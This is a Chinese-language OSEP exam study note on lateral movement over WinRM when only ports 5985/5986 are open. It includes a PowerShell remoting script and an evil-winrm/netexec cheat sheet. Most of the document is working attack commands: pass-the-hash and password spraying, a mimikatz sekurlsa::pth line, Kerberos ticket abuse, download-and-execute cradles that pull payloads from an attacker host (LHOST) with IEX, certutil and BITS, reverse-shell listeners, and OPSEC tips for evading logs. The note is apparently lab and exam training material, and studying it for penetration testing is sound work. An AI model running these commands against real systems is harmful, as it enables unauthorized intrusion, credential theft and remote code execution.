::: warning 仅限授权使用
本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
:::

# 15 · WinRM 横移（凭据有效 · 仅 WinRM 开放）

> **覆盖场景：**56
>
> **前置依赖：**已有一组合法凭据（密码 / NTLM 哈希 / Kerberos 票据）；目标 5985（HTTP）或 5986（HTTPS）可达；攻击机为 Kali（含 evil-winrm、netexec、impacket）或一台已控 Windows 跳板

---

## 场景 56：凭据有效，但目标只开放 WinRM

**场景回顾**：身份是对的，但 SMB（445）不通——凡依赖 SMB 的横移执行手段（PsExec、WMIC、smbexec、经 `admin$` 放文件再触发计划任务等）全部报废；目标仅暴露 WinRM 管理端口，要用 WinRM 会话完成执行与后续横向。

**前提与假设**：
- 我方已持有：`USER` + `PASS`（明文），或 `USER` + `NTHASH`（NTLM 哈希），或目标域内 Kerberos 票据（ccache/TGT）。
- 目标侧：5985/5986 监听（`winrm` 服务）；该账户属于目标本地 `Administrators` 或 `Remote Management Users`（WinRM 默认只允许这两组）。域环境下还要确认用户有目标机本地权限，而不只是域内合法用户。
- 网络：Kali→目标 5985/5986 通；目标到 Kali 的 445/139 不通（否则不需要走本场景）。若在多层跳板后，先保证端口转发/代理可达 5985/5986。
- 必须放弃的执行方法（**SMB 不通即失效，别浪费时间**）：`psexec.py`/PsExec、`wmiexec.py`/WMIC（多数实现要写 `admin$`）、`smbexec.py`、SMB 中继、经 SMB 复制脚本文件再 `schtasks`/`sc` 触发、`admin$` 放 PowerShell 脚本。

**准备（攻击机侧）**：
1. Kali 确认工具存在：
   ```bash
   which evil-winrm netexec 2>/dev/null
   gem list winrm 2>/dev/null | head -3    # evil-winrm 依赖 winrm gem
   ```
   evil-winrm 缺失时：`sudo gem install evil-winrm`（Kali 一般自带；也可用 apt 包 `evil-winrm`）。netexec 是 crackmapexec 的接替者（Kali 上 `netexec`），两者命令都给出。
2. 端口连通性确认（先于认证排错）：
   ```bash
   nc -nvz TARGET 5985; nc -nvz TARGET 5986    # 任一开即可
   ```
   HTTPS（5986）场景需 `evil-winrm -S`，并把自签证书问题放后面处理。
3. 若走 Kerberos：准备 `/etc/hosts` 或可解析的 `DOMAIN` 域名、确认能到 KDC（TCP/88）、校时（`ntpdate`/`chronyd`，票据对时钟漂移极敏感，>5 分钟即失败）。
4. 准备好会话内后续载荷（WinRM 会话本身就是执行通道，多数情况无需落地文件）：
   - PowerShell 内存下载执行（IEX cradles）；
   - 需要落地时走目标自己的出网下载（certutil/BITS），而不是 SMB 回拷。

**执行步骤**：

1. **判断该账户在目标上是否有 WinRM 权限**（顺便确认凭据本身有效）：
   ```bash
   # 明文
   netexec winrm TARGET -u USER -p 'PASS'
   # 哈希（Pass-the-Hash over NTLM）
   netexec winrm TARGET -u USER -H NTHASH
   # 域环境带域名（-d 后接 DOMAIN）
   netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
   ```
   期望输出：`[+] TARGET:5985 - ... (Pwn3d!)`。`(Pwn3d!)` 表示该账户在本地管理员组；没有该标记但仍能认证时，命令可能仍可执行（Remote Management Users 非管理员也能跑 WinRM），下面步骤 3 会真正验证。
2. **（备选批量）多目标/喷密码**：见 cheat sheet `WinRM password spraying`/`Multiple targets with WinRM`：
   ```bash
   netexec winrm targets.txt -d DOMAIN -u USER -p 'PASS' --continue-on-success
   ```
3. **用 evil-winrm 拿会话（明文或哈希两条线）**：
   ```bash
   # 明文（HTTP）
   evil-winrm -i TARGET -u USER -p 'PASS'
   # 明文 + 域名（NTLM 时一般不需要，Kerberos 时需要 -r）
   evil-winrm -i TARGET -u 'DOMAIN\USER' -p 'PASS'
   # NTLM 哈希（Pass-the-Hash）
   evil-winrm -i TARGET -u USER -H NTHASH
   # HTTPS
   evil-winrm -i TARGET -u USER -p 'PASS' -S
   ```
   进入后提示符为 `*Evil-WinRM* PS C:\...>`，先跑 `whoami` 与 `whoami /priv` 确认身份。
4. **Kerberos 认证线（域环境、无明文密码但有票据/想避免 NTLM 日志时）**：
   前置：目标主机名解析（`/etc/hosts` 加 `TARGET-IP  target.dom`）、拿到该账户 TGT：
   ```bash
   # 用密码换 TGT（ccache）
   impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
   export KRB5CCNAME=$(pwd)/USER.ccache
   # 或已有票据时直接导出
   netexec winrm TARGET.dom -d DOMAIN -u USER -k --use-kcache
   ```
   evil-winrm 对 Kerberos 支持弱（依赖环境变量），Kerberos 会话推荐两条替代：
   - 从已控 **Windows 跳板**：`Enter-PSSession -ComputerName TARGET -Credential ...` 用 Kerberos 默认认证；
   - Kali 上 `netexec winrm ... -k`（配合 `KRB5CCNAME`）。
   Kerberos 失败先查：域名解析、时钟漂移、SPN `http/target.dom` 是否存在、票据是否过期。
5. **会话内确认可执行命令**（认证成功 ≠ 能执行，非管理员 Remote Management Users 可能被语言模式/执行策略限制）：
   ```powershell
   whoami
   [Environment]::Is64BitOperatingSystem
   Get-ExecutionPolicy -List          # 只影响脚本文件，不影响交互命令
   ```
6. **会话内投放后续 payload（无 SMB 时的两条通道）**：
   - **内存执行（首选，不落盘）**：
     ```powershell
     # 攻击机起 HTTP 投递： python3 -m http.server 80
     IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')
     # 或下载到内存再 Invoke-Expression；需要传参时用脚本块包装
     ```
     evil-winrm 的 `scripts/` 与 `loot/` 只是本地目录，上传/下载走 WinRM 协议本身（`upload`/`download` 命令），不依赖 SMB。
   - **落地执行（确需文件时，从目标自己出网下载）**：
     ```powershell
     certutil -urlcache -split -f http://LHOST/PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe
     # 备选： BITSAdmin / Start-BitsTransfer / powershell -c (New-Object Net.WebClient)
     ```
     禁止假设能经 `\\LHOST\share` 拉文件——SMB 不通是本场景的前提。
7. **（Windows 跳板线）不用 evil-winrm，直接在已控 Windows 上 PowerShell Remoting**：
   ```powershell
   # 交互单命令
   winrs -r:TARGET -u:DOMAIN\USER -p:PASS "whoami"
   # 或 PSSession（先允许凭据）
   $pw = ConvertTo-SecureString 'PASS' -AsPlainText -Force
   $c  = New-Object System.Management.Automation.PSCredential('DOMAIN\USER',$pw)
   $s  = New-PSSession -ComputerName TARGET -Credential $c
   Invoke-Command -Session $s -ScriptBlock { whoami; hostname }
   # 会话内再起反向连接 / 投放同上面第 6 步
   ```
   `winrs`/WinRM 客户端在 Windows 10/Server 2016+ 默认存在；被管理端需已启用 PS-Remoting（考试靶机开 WinRM 端口即视为已启用）。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m15-winrm-auth-matrix.ps1` | 明文/哈希/Kerberos 三模板 + 失败排查清单（PowerShell Remoting 线） | `-Target`、`-User`、`-Pass`/`-NtHash`、`-Domain` |
| `m15-winrm-lateral.md` | evil-winrm / netexec 命令速查 + 会话内 payload 投放备忘 | — |

#### `m15-winrm-auth-matrix.ps1` {#m15-winrm-auth-matrix-ps1}

````powershell
<#
# 用途：WinRM 横移的 PowerShell Remoting 认证三模板（明文 / NTLM 哈希 / Kerberos）
#       一次调用完成：端口预检 -> 建 PSSession -> 单发命令或进交互会话；失败时输出排查方向。
# 场景：56（SMB 不通仅 WinRM 开放；Windows 跳板线，Linux 线见 m15-winrm-lateral.md）
# 依赖：Windows 10/Server 2016+ 自带；无第三方模块。
#       - 哈希线若走 mimikatz pth，需自行准备 mimikatz.exe（-Mimikatz 参数给路径）。
# 使用：
#   .\m15-winrm-auth-matrix.ps1 -Target TARGET -User USER -Pass 'PASS' [-Domain DOMAIN] [-Interactive]
#   .\m15-winrm-auth-matrix.ps1 -Target TARGET -User USER -NtHash NTHASH             # 哈希线指引见输出
#   .\m15-winrm-auth-matrix.ps1 -Target TARGET.fqdn -User DOMAIN\USER -Kerberos      # 用当前票据走 Kerberos
# 占位符：TARGET=目标IP/主机名  USER=用户名  PASS=明文密码  NTHASH=NTLM哈希(32hex)
#         DOMAIN=AD域名（可选，用于构造 DOMAIN\USER）
# 测试状态：本机仅做语法级自检（PowerShell parser）；未在真实域/靶机实测，
#           需在 OSEP 实验网按上表逐行验证。
# 关键事实：New-PSSession 只收明文密码；NTLM 哈希无原生 PTH，替代指引见 -NtHash 分支。
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Target,          # 目标 IP 或 FQDN
    [Parameter(Mandatory = $true)][string]$User,            # 用户名（可带 DOMAIN\ 前缀）
    [string]$Pass,                                          # 明文密码
    [string]$NtHash,                                        # NTLM 哈希（32 位 hex）
    [string]$Domain,                                        # 可选 AD 域名
    [switch]$Kerberos,                                      # 用 Kerberos 认证（需域环境）
    [switch]$Interactive,                                   # 进入交互 Enter-PSSession
    [switch]$UseSSL,                                        # 目标 5986（HTTPS）
    [string]$Command = 'whoami; hostname',                  # 默认单发命令
    [string]$Mimikatz                                       # 哈希线 mimikatz.exe 路径（可选）
)

$ErrorActionPreference = 'Stop'

function Write-Step($msg)  { Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok($msg)    { Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Fail($msg)  { Write-Host "[-] $msg" -ForegroundColor Red }

# ---------- 0. 参数互斥校验 ----------
if (-not $Pass -and -not $NtHash -and -not $Kerberos) {
    Write-Fail "必须提供三种凭据形态之一：-Pass 明文 / -NtHash 哈希 / -Kerberos（用当前票据）。"
    exit 1
}
if ($Pass -and $NtHash) {
    Write-Fail "-Pass 与 -NtHash 同时给出，二选一。"
    exit 1
}
if ($Domain) { $User = "$Domain\$User" }   # 统一成 DOMAIN\User（无 Domain 时保持原名/.\ 本地）

# ---------- 1. 端口预检（SMB 不通是本场景前提，别在 445 上浪费时间） ----------
Write-Step "检查目标 WinRM 端口 5985/5986 ..."
$http  = Test-NetConnection -ComputerName $Target -Port 5985 -WarningAction SilentlyContinue
$https = Test-NetConnection -ComputerName $Target -Port 5986 -WarningAction SilentlyContinue
if (-not $http.TcpTestSucceeded -and -not $https.TcpTestSucceeded) {
    Write-Fail "5985 与 5986 均不可达。先确认端口真的开了（nmap -Pn -p5985,5986），
    或本脚本所在跳板到目标的 5985/5986 需要先做端口转发（见模块 M08 隧道）。"
    exit 1
}
if ($UseSSL -and -not $https.TcpTestSucceeded) {
    Write-Fail "-UseSSL 要求 5986 开放，但 5986 不可达。去掉 -UseSSL 改走 5985。"
    exit 1
}
if (-not $UseSSL -and -not $http.TcpTestSucceeded) { $UseSSL = $true }  # 只有 5986 时自动切 HTTPS
Write-Ok "端口可达（5985=$($http.TcpTestSucceeded) 5986=$($https.TcpTestSucceeded)），使用 $($(if($UseSSL){'HTTPS'}else{'HTTP'}))。"

# ---------- 2. 认证形态分发 ----------
$sessionOption = New-PSSessionOption -OperationTimeoutSec 60 -OpenTimeoutSec 60
if ($UseSSL) { $sessionOption = New-PSSessionOption -OperationTimeoutSec 60 -OpenTimeoutSec 60 -SkipCACheck -SkipCNCheck }

$cred = $null
if ($Pass) {
    # --- 模板 A：明文密码（最稳，New-PSSession 原生支持） ---
    $secure = ConvertTo-SecureString $Pass -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($User, $secure)
    Write-Step "模板 A：明文密码认证 $User @ $Target"
    $params = @{
        ComputerName  = $Target
        Credential    = $cred
        SessionOption = $sessionOption
        ErrorAction   = 'Stop'
    }
    if ($UseSSL)  { $params.UseSSL = $true }
    if ($Kerberos){ $params.Authentication = 'Kerberos' }   # 域内可选：显式走 Kerberos
}
elseif ($NtHash) {
    Write-Step "模板 B：NTLM 哈希 $User @ $Target"
    if ($Mimikatz -and (Test-Path $Mimikatz)) {
        Write-Step "用 mimikatz sekurlsa::pth 注入哈希，再在提升后的进程里重跑本脚本（不带 -NtHash）或直接 winrs："
        Write-Host ("    {0} ""sekurlsa::pth /user:{1} /domain:{2} /ntlm:{3} /run:powershell.exe""" -f `
            $Mimikatz, $User.Split('\')[-1], $(if($User.Contains('\')){$User.Split('\')[0]}else{'.'}), $NtHash)
        Write-Ok  "PTH 成功后，在新开的 powershell 里执行：winrs -r:$Target whoami ，或本脚本改用 -Pass 前的当前令牌。"
    }
    else {
        Write-Host "[!] Windows 侧没有原生 NTLM-PTH-over-WinRM。两个替代（任选）："
        Write-Host "    1) Linux 线（推荐）：evil-winrm -i $Target -u $User -H $NtHash （见 m15-winrm-lateral.md）"
        Write-Host "    2) Windows 线：mimikatz sekurlsa::pth /user:$($User.Split('\')[-1]) /ntlm:$NtHash /run:powershell.exe，"
        Write-Host "       然后在新进程里 winrs -r:$Target whoami（令牌里已有哈希，走 NTLM 认证）。"
    }
    exit 0   # 哈希线不由本脚本直接建会话，避免给出跑不通的"假模板"
}
elseif ($Kerberos) {
    Write-Step "模板 C：Kerberos 认证 $User @ $Target"
    if ($Target -notmatch '\.') {
        Write-Fail "Kerberos 需要 FQDN：-Target 请给 target.dom 而不是纯 IP（SPN http/target.dom 解析依赖它）。"
        exit 1
    }
    # 说明：带 -Pass 的 Kerberos 走模板 A（A 里已按 -Kerberos 显式设 Authentication）；此处只处理当前票据形态
    $params = @{
        ComputerName  = $Target
        Authentication = 'Kerberos'
        SessionOption = $sessionOption
        ErrorAction   = 'Stop'
    }
    if ($UseSSL)  { $params.UseSSL = $true }
    if ($cred)    { $params.Credential = $cred }
}

# ---------- 3. 建会话 + 单发命令 / 交互 ----------
try {
    $session = New-PSSession @params
    Write-Ok "PSSession 建立成功：$($session.ComputerName)  State=$($session.State)"
}
catch {
    Write-Fail "New-PSSession 失败：$($_.Exception.Message)"
    Write-Host "==== 失败排查（按顺序核对） ===="
    Write-Host "1) 认证类 'Access is denied'/401：账户是否在目标 Administrators 或 Remote Management Users？域账户查 -Domain 拼写，本机账户用 .\USER。"
    Write-Host "2) 连接类：跳板到 5985/5986 是否需隧道？客户端 WinRM 服务先 Get-Service WinRM; Start-Service WinRM（0x803381xx 同此）。"
    Write-Host "3) HTTPS 证书：已自动加 -SkipCACheck/-SkipCNCheck；仍失败确认 5986 真是 WinRM。"
    Write-Host "4) Kerberos KRB_AP_ERR_*：FQDN 解析、时钟(<5min)、SPN http/目标FQDN 是否存在。"
    exit 1
}

if ($Interactive) {
    Write-Step "进入交互会话（输入 exit 退出）..."
    Enter-PSSession -Session $session
    Remove-PSSession $session
}
else {
    Write-Step "执行命令：$Command"
    try {
        Invoke-Command -Session $session -ScriptBlock ([scriptblock]::Create($Command))
        Write-Ok "命令执行完成。"
    }
    catch {
        Write-Fail "命令执行失败：$($_.Exception.Message)（认证成功≠可执行；Remote Management Users 非管理员可能受限，改试 cmd /c whoami）"
    }
    Remove-PSSession $session
}
````

#### `m15-winrm-lateral.md` {#m15-winrm-lateral-md}

````markdown
# m15 · WinRM 横移命令速查（Kali / evil-winrm / netexec 线）

> 场景 56：凭据有效、SMB 不通、仅 5985/5986 开放。本文是 Linux 攻击机一侧的速查；
>
> Windows 跳板一侧的模板见 `m15-winrm-auth-matrix.ps1`。
>
> 占位符：`TARGET`(IP/FQDN) `DOMAIN` `USER` `PASS` `NTHASH` `LHOST` `LPORT` `PAYLOAD` `URL`

## 1. 先判定（30 秒内决定路线）

```bash
nmap -Pn -p445,5985,5986 TARGET          # 445 不通才走本文；5985/5986 至少一个开
nc -nvz TARGET 5985; nc -nvz TARGET 5986
```

## 2. 认证 + 权限探测

```bash
# 明文
netexec winrm TARGET -u USER -p 'PASS'
# NTLM 哈希（Pass-the-Hash）
netexec winrm TARGET -u USER -H NTHASH
# 域账户带域名
netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
# 多目标批量（慎用，防锁账户）
netexec winrm targets.txt -d DOMAIN -u USER -p 'PASS' --continue-on-success
```

- `(Pwn3d!)` = 账户在目标本地管理员组 → 命令执行基本无障碍。
- 只有 `[+]` 无 `(Pwn3d!)` = 认证通过但非管理员；仍可能有 Remote Management Users 权限，进会话验证。

## 3. 交互会话（evil-winrm）

```bash
# 明文 HTTP（5985）
evil-winrm -i TARGET -u USER -p 'PASS'
# 域内显式域名
evil-winrm -i TARGET -u 'DOMAIN\USER' -p 'PASS'
# NTLM 哈希
evil-winrm -i TARGET -u USER -H NTHASH
# HTTPS（5986）
evil-winrm -i TARGET -u USER -p 'PASS' -S
# 指定脚本/字典目录（本机路径，仅本地使用）
evil-winrm -i TARGET -u USER -p 'PASS' -s /opt/evil-winrm/scripts
```

会话内基本操作：

```text
*Evil-WinRM* PS> whoami ; whoami /priv
*Evil-WinRM* PS> upload ./PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe   # 走 WinRM 通道，不依赖 SMB
*Evil-WinRM* PS> download C:\Windows\Temp\result.txt ./result.txt
*Evil-WinRM* PS> menu          # 列出内置功能（services/reg/loot 等）
```

> 注意：evil-winrm 的 `menu` 里 `services`/`reg` 走其内置实现；抓密码类长任务建议一行命令执行并即时抄输出。

## 4. Kerberos 线（域环境；无 SMB 也可，需票据/域名/时钟三前置）

```bash
# 前置：可解析 FQDN + 校时
echo "TARGET-IP  target.dom" >> /etc/hosts
sudo ntpdate DC_IP || chronyc makestep     # 与 DC 时钟差 <5 分钟

# 用密码换 TGT（ccache），或已有 .ccache 直接用
impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
export KRB5CCNAME=$(pwd)/USER.ccache

# 用票据认证（注意 -Target 要 FQDN）
netexec winrm target.dom -d DOMAIN -u USER -k --use-kcache
```

- evil-winrm 对 Kerberos 支持弱；Kerberos 交互建议从 Windows 跳板 `Enter-PSSession -Authentication Kerberos`（见 m15-winrm-auth-matrix.ps1 模板 C）。
- Kerberos 报 `KRB_AP_ERR_MODIFIED` / `KDC_ERR_*`：先查 `/etc/hosts`、时钟、`klist` 票据是否过期，再查 SPN：`impacket-GetUserSPNs` 或 `ldapsearch`。

## 5. 会话内 payload 投放（无 SMB 的两条通道）

### 5.1 内存执行（首选，不落盘）

攻击机起投递：

```bash
python3 -m http.server 80            # 或 python3 -m http.server 443
# 监听回连
nc -lvnp LPORT
```

evil-winrm 会话内：

```powershell
# 下载执行 .ps1
IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')

# 不想落地又不依赖文件：直接反向连接一行（msfvenom 生成后 base64）
$b = [Convert]::FromBase64String('...'); $m=[System.Diagnostics.Process]::GetCurrentProcess(); ...
```

### 5.2 落地执行（确需文件时：目标自己出网下载，禁止走 \\LHOST\share）

```powershell
certutil -urlcache -split -f http://LHOST/PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe
# 备选
Start-BitsTransfer -Source http://LHOST/PAYLOAD.exe -Destination C:\Windows\Temp\PAYLOAD.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST/PAYLOAD.exe','C:\Windows\Temp\PAYLOAD.exe')"
```

再触发：`C:\Windows\Temp\PAYLOAD.exe`（管理员会话可直接跑；非管理员按最小权限先收集信息）。

### 5.3 文件反传（目标→攻击机，绕过出网限制）

```text
# 把结果写到目标临时文件后 download 回本机（走 WinRM，无需目标出网）
*Evil-WinRM* PS> whoami /all | Out-File C:\Windows\Temp\out.txt -Encoding ascii
*Evil-WinRM* PS> download C:\Windows\Temp\out.txt ./out.txt
```

## 6. 常见失败速查

| 现象 | 原因与处理 |
|---|---|
| `Access is denied` / 401 | 不在 Remote Management Users/Administrators；域账户查 -d 域名写法 |
| 认证 OK 但 `(Pwn3d!)` 缺失 | 非管理员，先进会话验证能否执行 |
| 5986 证书错 | evil-winrm 默认接受自签；仍报错先确认真的是 WinRM TLS |
| `KRB_AP_ERR_MODIFIED` | 时钟漂移 / hosts 解析，非密码问题 |
| evil-winrm 起不来 | Ruby/gem 环境损坏 → 换 netexec winrm 或 Windows 线 |
| 长命令卡死 | 拆一行命令、输出重定向到文件再 download |

## 7. 考试注意 / OPSEC

- 5985 登录在目标留 4624/4625 + WinRM 操作日志；批量喷密码会锁账户，次数受控。
- 哈希（NTLM）认证在 DC 侧留 4776 日志；要更隐蔽只能走 Kerberos（用票据，不落密码）。
- 长命令（mimikatz sekurlsa::logonpasswords）放 evil-winrm 里易超时：一次一行、抄完再跑。
````

**验证**：
- `netexec winrm` 输出 `(Pwn3d!)` 或至少 `[+]`（认证成功）。
- evil-winrm 进入会话并 `whoami` 返回预期身份。
- 后续投放以回连为最终验证：起监听（`nc -lvnp LPORT` / msfconsole handler），会话内执行反向连接载荷，Kali 侧收到连接。
- 无法回连时用**带外验证**：`Invoke-Command` 执行 `cmd /c "ping LHOST"` 并在 Kali 侧 `tcpdump -i any icmp`；或让目标 `curl http://LHOST/flag` 看投递服务器日志 404/200（参考 doc 00 的带外验证规范）。

**失败分支与备选**（≥2）：
1. **认证被拒（`Access is denied` / 401）** → 先查账户是否在目标 `Remote Management Users`/`Administrators`；域账户则确认 `DOMAIN` 拼写与大小写、`-d` 参数；哈希线确认是 NTLM 哈希（32 hex）而非 LM 或 Kerberos 哈希。仍不行→换 Windows 跳板用 `New-PSSession` 再试，把"工具问题"与"权限问题"分开。
2. **5985 通但 5986 才开，或反之** → 换 `-S`（HTTPS）并处理自签证书（evil-winrm 默认接受自签，若报证书错加 `--no-ssl-peer-verification` 之类选项前先确认版本）；反过来 HTTP 更省事，优先 5985。
3. **认证成功但命令执行失败/空回显** → 账户可能在 `Remote Management Users`（非管理员）且 PowerShell 受限：先试简单命令 `cmd /c whoami`；再试 `-NoProfile` 类参数；非管理员账户的枚举/后续投放受限时，把它当"受限低权限会话"处理（收集信息为主，提权另走模块 M06）。
4. **evil-winrm 起不来（Ruby/gem 环境问题）** → 转 netexec `winrm` 模块单发命令，或转 Windows 跳板 `winrs`/`New-PSSession`；这些都不依赖 Ruby。
5. **Kerberos 一直失败** → 放弃 Kerberos 走 NTLM 哈希线（`-H`），前提是明文/哈希都有；若只有票据没有密码，检查 `KRB5CCNAME`、`/etc/krb5.conf` realm、时钟（`date` 与 DC 差 <5 分钟）。
6. **需要落地文件但目标出网也受限** → 用 evil-winrm `upload`（走 WinRM 5985 通道本身，不需要 445/80 出网）；上传到 `C:\Windows\Temp` 或用户 `%TEMP%`，注意写入权限与 Defender 扫描路径。

**考试注意 / OPSEC**：
- **先确认 SMB 真的不通**再放弃 PsExec 系——多数考生丢分是没做端口判断就在错误通道上死磕。`nmap -Pn -p445,5985 TARGET` 一次说清。
- 5985 走 WinRM 会在目标留下 PowerShell 会话与 4624/4625 登录日志、`Microsoft-Windows-WinRM` 操作日志；哈希线（NTLM）在 DC 上留 4776。批量喷密码（步骤 2）会把账户锁风险放大，**仅在明确允许且次数受控时用**。
- evil-winrm 的 `upload`/`download`、`scripts`/`loot` 只在会话内有效：文件走 WinRM 通道，**别**在文档/笔记里写"经 SMB 共享传文件"这类与本场景矛盾的步骤。
- 会话是交互式的：执行长时间任务（如 mimikatz sekurlsa）在 evil-winrm 里容易卡/超时，参考 cheat sheet `Having an Evil-WinRM session` 的建议——拆成一行命令执行、结果即时抄录，或把输出重定向到文件再 `download`。
- 域名/主机名解析在 Kerberos 线是硬前置；Kali 记得把目标主机名写进 `/etc/hosts`，否则 SPN 解析失败报 `KRB_AP_ERR_MODIFIED` 之类，先查时钟。
- 非管理员会话里别立刻上提权/抓密码工具，先按最小权限做信息收集，再决定是否需要模块 M06 的提权路径。

---

## 模块速查表

```bash
# 1) 端口判定（决定是否走本模块）
nmap -Pn -p445,5985,5986 TARGET

# 2) 认证 + 权限探测（明文 / 哈希 / 域）
netexec winrm TARGET -u USER -p 'PASS'
netexec winrm TARGET -u USER -H NTHASH
netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'

# 3) 交互会话（evil-winrm）
evil-winrm -i TARGET -u USER -p 'PASS'
evil-winrm -i TARGET -u USER -H NTHASH
evil-winrm -i TARGET -u USER -p 'PASS' -S        # 5986 HTTPS

# 4) Kerberos（域内、无 SMB、无明文也行的线）
impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
export KRB5CCNAME=$(pwd)/USER.ccache
netexec winrm TARGET.dom -d DOMAIN -u USER -k --use-kcache

# 5) 会话内内存投放（首选，不落盘）
IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')

# 6) Windows 跳板线
winrs -r:TARGET -u:DOMAIN\USER -p:PASS "whoami"
$s = New-PSSession -ComputerName TARGET -Credential (DOMAIN\USER,PASS)
Invoke-Command -Session $s -ScriptBlock { whoami; hostname }

# 7) 落盘备选（目标自己出网下载）
certutil -urlcache -split -f http://LHOST/PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe
```

---

## 关联脚本清单

| 文件 | 说明 |
|---|---|
| `m15-winrm-auth-matrix.ps1` | 从 Windows 侧 PowerShell Remoting 的明文/哈希/Kerberos 认证三模板与失败排查 |
| `m15-winrm-lateral.md` | Kali（evil-winrm/netexec）命令速查 + 会话内 payload 投放备忘 |
